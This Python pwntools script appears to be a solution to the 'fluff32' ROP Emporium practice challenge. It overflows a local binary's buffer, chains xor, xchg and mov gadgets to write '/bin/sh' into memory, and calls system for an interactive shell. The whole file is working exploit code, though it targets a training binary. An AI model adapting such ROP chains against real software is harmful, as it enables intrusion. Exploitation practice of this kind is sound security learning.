from pwn import *

buffer = 0x804a028
system = 0x8048430

string = '/bin/sh\x00'

# xor edx,edx; pop esi; mov ebp,0xcafebabe; ret;
gadget1 = 0x08048671
# pop ebx; ret;
gadget2 = 0x080483e1
# xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret;
gadget3 = 0x0804867b
# xchg edx,ecx; pop ebp; mov edx,0xdefaced0; ret;
gadget4 = 0x08048689
# mov DWORD PTR [ecx],edx; pop ebp; pop ebx; xor BYTE PTR [ecx],bl; ret;
gadget5 = 0x08048693
# inc ecx; ret;
gadget6 = 0x080488ba

p = process('./fluff32')

payload = 'a' * 44

payload += p32(gadget1)
payload += 'bbbb'

payload += p32(gadget2)
payload += p32(buffer)

payload += p32(gadget3)
payload += 'bbbb'

payload += p32(gadget4)
payload += 'bbbb'

# edx contains 0xdefaced0
# ebx should be 0xdefaced0 ^ '/bin'[::-1] = 0xb093acff
payload += p32(gadget2)
payload += p32(0xb093acff)

payload += p32(gadget3)
payload += 'bbbb'

payload += p32(gadget5)
payload += 'bbbb'
payload += '\x00' * 4

# edx currently has 0x6e69622f which is '/bin'[::-1]
# we want it to contain '/sh\x00'[::-1]
# therefore 0x6e69622f ^ '/sh\x00'[::-1] = 0x6e011100
payload += p32(gadget2)
payload += p32(0x6e011100)

payload += p32(gadget3)
payload += 'bbbb'

payload += p32(gadget6)
payload += p32(gadget6)
payload += p32(gadget6)
payload += p32(gadget6)

payload += p32(gadget5)
payload += 'bbbb'
payload += '\x00' * 4

payload += p32(system)
payload += 'cccc'
payload += p32(buffer)

p.sendline(payload)
p.interactive()
